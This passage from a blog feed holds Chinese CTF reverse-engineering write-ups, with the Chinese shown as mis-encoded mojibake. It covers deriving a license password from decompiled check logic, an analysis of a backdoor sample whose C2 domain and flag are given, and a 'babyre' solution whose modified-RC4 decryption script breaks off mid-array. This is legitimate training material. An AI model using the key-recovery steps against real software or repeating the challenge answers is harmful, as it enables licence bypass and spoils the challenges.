punctuation\">(</span>v20<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// v17=v20[j]^v21[j]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>          <span class=\"token operator\">*</span><span class=\"token function\">sub_565DF8D6</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v17<span class=\"token punctuation\">;</span>          <span class=\"token comment\">// v21[j]=v17</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>                                       <span class=\"token comment\">// ä¸åŒçš„è½® v20 è¿˜æ˜¯ä¸€æ · v21 ä¸ä¸€æ ·äº†</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token function\">sub_565DF8D6</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 33 ä½å˜ 0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        v4 <span class=\"token operator\">=</span> <span class=\"token function\">sub_565DF92A</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                 <span class=\"token comment\">// æŒ‡é’ˆ</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> v4<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> input<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>            <span class=\"token comment\">// é€ä½éªŒè¯</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          v5 <span class=\"token operator\">=</span> m <span class=\"token operator\">/</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>          v6 <span class=\"token operator\">=</span> m<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>          v19<span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> v5 <span class=\"token operator\">+</span> v6 <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          v39 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>                                <span class=\"token comment\">// æœ€ç»ˆ v19 çš„å€¼æ˜¯å…³é”® åé¢ç”¨åˆ°</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v39 <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token operator\">++</span>k<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ä¸Šé¢ v21 æ•°ç»„æœ‰åˆå€¼ï¼Œv20 æ•°ç»„å®šå€¼</p>\n<p>v21 è¿è¡Œä¼šç”Ÿæˆä¸€ä¸ªå›ºå®šçš„è¡¨è¿›è¡ŒéªŒè¯</p>\n<p>v4 æ˜¯ä¸€ä¸ªå›ºå®šçš„è¡¨:</p>\n<p>23456789ABCDEFGHJKLMNPQRSTUVWXYZ</p>\n<p>ä¿®æ”¹æ„é€ å¯†ç ä¸ºï¼š33333-22222-33333-44444-55555 æˆ–è€… 33333-22222-AAAAA-BBBBB-CCCCC</p>\n<p>v19 é‡Œé¢å­˜çš„æ˜¯æ¯ä¸ªå¯†ç ç›¸å¯¹äºå¯¹äºè¡¨ä¸­çš„ä½ç½®ï¼Œ2â†’0, 3â†’1, 4â†’2</p>\n<p>æ„Ÿè§‰æ€è·¯æ˜¯æ ¹æ®åé¢å¯¹ name çš„è¿ç®— é€†å‘æ¨å‡º v19 çš„å€¼ï¼Œå†æ¨å‡ºå¯†ç </p>\n<p>ç›´æ¥åœ¨ä¸‹æ–­ç‚¹</p>\n<p><img data-src=\"/images/121.png\" alt=\"121\"></p>\n<p>å¾— v18 å†æ±‚å…¶é€†çŸ©é˜µ æ±‚ v19 å°±è¡Œ    v19 çŸ¥é“äº†å†æŸ¥è¡¨å°±çŸ¥é“å¯†ç äº†</p>\n<p><img data-src=\"/images/image2.png\" alt=\"image2\"></p>\n<p>åˆ†æç»“æœå°±æ˜¯è¿™ä¸ªå®˜æ–¹ WP ä¸­çš„å›¾</p>\n<p>å¯¹äºæ±‚é€†çŸ©é˜µ å†™äº†ä¸ª z3 è„šæœ¬å´æ€ä¹ˆä¹Ÿæ²¡è·‘å‡º</p>\n<p>çœ‹äº† WP æ‰å‘ç°å…¶å®æœ‰ä¸€ä¸ªåè°ƒè¯•â€¦</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/06/18/DSACTF%E9%80%86%E5%90%91%E4%B8%93%E9%A1%B9/",
            "url": "https://3cly.github.io/2023/06/18/DSACTF%E9%80%86%E5%90%91%E4%B8%93%E9%A1%B9/",
            "title": "DSACTFé€†å‘ä¸“é¡¹",
            "date_published": "2023-06-18T07:29:46.000Z",
            "content_html": "<h1 id=\"dsactfé€†å‘ä¸“é¡¹\"><a class=\"markdownIt-Anchor\" href=\"#dsactfé€†å‘ä¸“é¡¹\">#</a> DSACTF é€†å‘ä¸“é¡¹</h1>\n<h2 id=\"careful\"><a class=\"markdownIt-Anchor\" href=\"#careful\">#</a> careful</h2>\n<p>çº¯çº¯çš„ç­¾åˆ°</p>\n<p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªæ¶æ„æ ·æœ¬ï¼Œè¯·åˆ†æå‡ºæ ·æœ¬è¯·æ±‚æœåŠ¡å™¨çš„åŸŸå (flag çš„å½¢å¼ä¸º DASCTF {md5 (åŸŸå)}) å…¶ä¸­ md5 å€¼éƒ½æ˜¯å°å†™</p>\n<p><img data-src=\"/images/image-20230604094259190.png\" alt=\"image-20230604094259190\"></p>\n<p>ç¬¬ä¸€çœ¼çœ‹æ„Ÿè§‰åƒæ˜¯æ¯”è¾ƒæ•°æ®ä»€ä¹ˆçš„</p>\n<p>ç›´æ¥ gpt åˆ†æå¾—å‡º (å…¶å®ä¹Ÿä¸ç”¨åˆ†æï¼Œåªæ˜¯å¯ä»¥äº†è§£ä¸€ä¸‹)</p>\n<p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç”¨äºè¿œç¨‹æ§åˆ¶çš„ç¨‹åºï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯é€šè¿‡ç½‘ç»œè¿æ¥åˆ°æŒ‡å®šç›®æ ‡ä¸»æœºå¹¶æ‰§è¡Œæ¥æ”¶åˆ°çš„å‘½ä»¤ã€‚</p>\n<ol>\n<li>WSAStartup (0x202u, &amp;WSAData) åˆå§‹åŒ–å¥—æ¥å­—åº“ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› 0ã€‚</li>\n<li>socket (2, 1, 6) åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—ï¼Œä½¿ç”¨ IPv4 å’Œ TCP åè®®ï¼Œå¦‚æœå¤±è´¥åˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶è¿”å› 0ã€‚</li>\n<li>è®¾ç½®è¿æ¥ç›®æ ‡ä¸»æœºçš„ IP åœ°å€å’Œç«¯å£å·ç­‰å‚æ•°ã€‚</li>\n<li>connect ((SOCKET) s, &amp;v12, 16) å»ºç«‹ä¸ç›®æ ‡ä¸»æœºçš„è¿æ¥ï¼Œå¦‚æœæˆåŠŸåˆ™è¾“å‡ºè¿æ¥æˆåŠŸçš„ä¿¡æ¯ã€‚</li>\n<li>ç„¶åè¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œä¸æ–­åœ°æ¥æ”¶ä»ç›®æ ‡ä¸»æœºå‘é€è¿‡æ¥çš„å‘½ä»¤ï¼Œå¹¶æ‰§è¡Œè¿™äº›å‘½ä»¤ã€‚</li>\n<li>åœ¨å¾ªç¯å†…éƒ¨ï¼Œæ¯æ¬¡æ¥æ”¶åˆ°æ¶ˆæ¯ä¹‹åï¼Œä½¿ç”¨ CreateProcessA å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå¹¶åœ¨å…¶ä¸­æ‰§è¡Œæ¥æ”¶åˆ°çš„å‘½ä»¤ã€‚</li>\n<li>ä½¿ç”¨ WaitForSingleObject å‡½æ•°ç­‰å¾…æ–°è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚</li>\n<li>å¦‚æœ connect å‡½æ•°è¿”å›å¤±è´¥ï¼Œåˆ™è¾“å‡ºè¿æ¥é”™è¯¯çš„ä¿¡æ¯å¹¶è¿”å› 1ã€‚</li>\n</ol>\n<p>flag ç›´æ¥ä¸‹æ–­ç‚¹è°ƒè¯•å¾— ä¸è¯´äº† çœ‹å›¾éƒ½æ‡‚äº†</p>\n<p><img data-src=\"/images/image-20230604131531558.png\" alt=\"image-20230604131531558\"></p>\n<p><img data-src=\"/images/image-20230604132908731.png\" alt=\"image-20230604132908731\"></p>\n<p><img data-src=\"/images/image-20230604132607210.png\" alt=\"image-20230604132607210\"></p>\n<p><img data-src=\"/images/image-20230604132526463.png\" alt=\"image-20230604132526463\"></p>\n<p>å°å­¦ç”Ÿéƒ½ä¼šçš„åŠ¨è°ƒè°ƒè¯•ï¼Œ</p>\n<p>åŸŸåï¼šJust_An_APIH00k11.com</p>\n<p f18566f93963f72f463fdfa2d163c37c>DSACTF</p>\n<h2 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> babyre</h2>\n<p>å…¶å®ä¸éš¾ åªæ˜¯æˆ‘å¤ªä¹…æ²¡åšé¢˜äº† (ç‹¡è¾©)</p>\n<p>shift+F12 å‘ç°æˆåŠŸå­—ç¬¦è·³åˆ°æ¯”è¾ƒ</p>\n<p><img data-src=\"/images/image-20230604142008084.png\" alt=\"image-20230604142008084\"></p>\n<p>å‰é¢æ˜¯åŠ å¯†</p>\n<p><img data-src=\"/images/image-20230604141602766.png\" alt=\"image-20230604141602766\"></p>\n<p>2000 çš„å¼‚æˆ–æ•°ç»„</p>\n<p>ç„¶å<strong>äº¤å‰å¼•ç”¨</strong>å‘ç°<img data-src=\"/images/image-20230604201729150.png\" alt=\"image-20230604201729150\"><strong>isdebuggerpresent</strong></p>\n<p>ç›´æ¥åœ¨æ•°ç»„é‡Œæ”¹å›æ¥å°±è¡Œ ç„¶åæˆ‘é€‰æ‹© dump å‡ºæ¥è¿™ä¸ªåŠ å¯†éƒ¨åˆ†</p>\n<p><img data-src=\"/images/QQ%E5%9B%BE%E7%89%8720230604214606.png\" alt=\"QQå›¾ç‰‡20230604214606\"></p>\n<p>å†æ”¾å…¥ IDA</p>\n<p><img data-src=\"/images/image-20230604202155486.png\" alt=\"image-20230604202155486\"></p>\n<p>æ­£ç¡®çš„å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230604202220435.png\" alt=\"image-20230604202220435\"></p>\n<p><img data-src=\"/images/image-20230604205047698.png\" alt=\"image-20230604205047698\"></p>\n<p>é­”æ”¹äº† 2 éƒ¨åˆ†</p>\n<p><img data-src=\"/images/image-20230604205905954.png\" alt=\"image-20230604205905954\"></p>\n<p>ç´«ç ‚äº† çœ¼ç›éƒ½çœ‹èŠ±äº† æœ€åå†™çš„è§£å¯†è„šæœ¬å¦‚ä¸‹</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">rc4</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> keylen<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> datalen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span>keylenl<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// åˆå§‹åŒ– S ç›’</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t x <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>j<span class=\"token operator\">+</span> x  <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span> keylenl<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// äº¤æ¢ S [i] å’Œ S [j]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">++</span>keylenl <span class=\"token operator\">>=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tkeylenl <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    i <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> n <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> datalen<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> j<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// äº¤æ¢ S [i] å’Œ S [j]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        x <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tdata<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span>n<span class=\"token operator\">%</span><span class=\"token number\">13</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        data<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> s<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>j <span class=\"token operator\">+</span> s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">93</span><span class=\"token punctuation\">,</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">,</span><span class=\"token number\">41</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">71</span><span class=\"token punctuation\">,</span><span class=\"token number\">65</span><span class=\"token punctuation\">,</span><span class=\"token number\">21</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> keylen <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> <span class=\"token comment\">// å‡å»æœ«å°¾çš„ '\\0'</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">44</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tdata<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">9</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">46</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">52</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">114</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">49</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">94</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">69</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">79</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">43</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">112</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">120</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">120</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">19</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">70</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">56</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">37</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">38</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">108</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">67</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">44</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">23</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">119</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">14</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  data<span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">49</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  data<span class=\"token 